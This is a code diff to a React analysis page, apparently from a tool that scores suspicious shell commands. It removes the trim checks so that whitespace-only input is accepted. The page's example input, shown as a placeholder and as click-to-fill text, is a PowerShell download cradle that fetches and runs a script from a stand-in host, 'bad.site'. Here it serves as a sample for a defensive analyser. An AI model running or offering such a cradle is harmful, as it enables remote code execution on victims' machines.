@@ -239,7 +239,7 @@ export default function AnalysisPage() {
   );
 
   const handleNewAnalysis = async () => {
-    // ✅ FIX: Aceitar comando vazio ou apenas espaços
+    // ✅ FIX: Enviar comando raw sem validação de trim
     if (newCommand.length > 0) {
       if (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit) {
         setError("Rate limit reached. Please wait for the timer to reset.");
@@ -249,28 +249,25 @@ export default function AnalysisPage() {
       analysisExecutedRef.current = false; 
       setError("");
       
-      // ✅ FIX: Enviar comando sem trim
-      await performAnalysis(newCommand); // ✅ SEM TRIM
+      // ✅ FIX: Enviar comando raw sem trim ou validação
+      await performAnalysis(newCommand);
       
       setNewCommand("");
     }
   };
 
-
   useEffect(() => {
-    
     const command = params.get("cmd") || "";
     const ipAddress = params.get("ip") || null;
     const country = params.get("country") || null;
     
-    
     setCmd(command);
     setNewCommand(command);
     
-    if (command.trim() && !analysisExecutedRef.current) {
+    // ✅ FIX: Processar comando mesmo que seja vazio ou apenas espaços
+    if (command.length > 0 && !analysisExecutedRef.current) {
       analysisExecutedRef.current = true;
       
-    
       const ipLocation = {
         country,
         city,
@@ -279,7 +276,7 @@ export default function AnalysisPage() {
       };
       
       performAnalysis(command);
-    } else if (!command.trim()) {
+    } else if (command.length === 0) {
       setLoading(false);
       setResult({
         score: 0,
@@ -320,7 +317,7 @@ export default function AnalysisPage() {
           </div>
           <ThemedButton
             onClick={handleNewAnalysis}
-            disabled={!newCommand.trim() || freshAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
+            disabled={newCommand.length === 0 || freshAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
             className="flex-shrink-0"
             loading={freshAnalysisLoading}
           >
@@ -328,8 +325,8 @@ export default function AnalysisPage() {
           </ThemedButton>
         </div>
         <InfoMessage 
-          message={!error && newCommand.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
-          clickable={!error && newCommand.trim() === ""}
+          message={!error && newCommand.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
+          clickable={!error && newCommand.length === 0}
           onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
         />
       </div>
